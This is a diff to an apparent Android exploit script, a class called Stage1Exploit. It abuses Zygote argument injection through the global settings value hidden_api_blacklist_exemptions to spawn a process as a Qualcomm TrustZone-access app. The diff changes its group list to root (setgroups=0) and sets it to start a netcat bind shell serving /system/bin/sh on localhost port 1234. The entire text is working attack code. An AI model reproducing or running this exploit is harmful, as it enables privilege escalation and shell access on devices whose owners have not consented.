@@ -191,7 +191,7 @@ class Stage1Exploit:
         raw_zygote_arguments = [
             "--setuid=10079",
             "--setgid=0",
-            "--setgroups=3003",
+            "--setgroups=0",
             "--target-sdk-version=28",
             "--nice-name=com.qualcomm.qti.qms.service.trustzoneaccess",
             "--app-data-dir=/data/user/0/com.qualcomm.qti.qms.service.trustzoneaccess",
@@ -247,7 +247,7 @@ class Stage1Exploit:
 
         netcat_command = self.find_netcat_command()
         parsed_netcat_command = shlex.join(netcat_command)
-        command = f"(settings delete global hidden_api_blacklist_exemptions;{parsed_netcat_command} -s 127.0.0.1 -p 1234 -L /vendor/bin/sh)&"
+        command = f"(settings delete global hidden_api_blacklist_exemptions;{parsed_netcat_command} -s 127.0.0.1 -p 1234 -L /system/bin/sh)&"
         exploit_value = self.generate_stage1_exploit(command, exploit_type)
         exploit_command = [
             "settings",
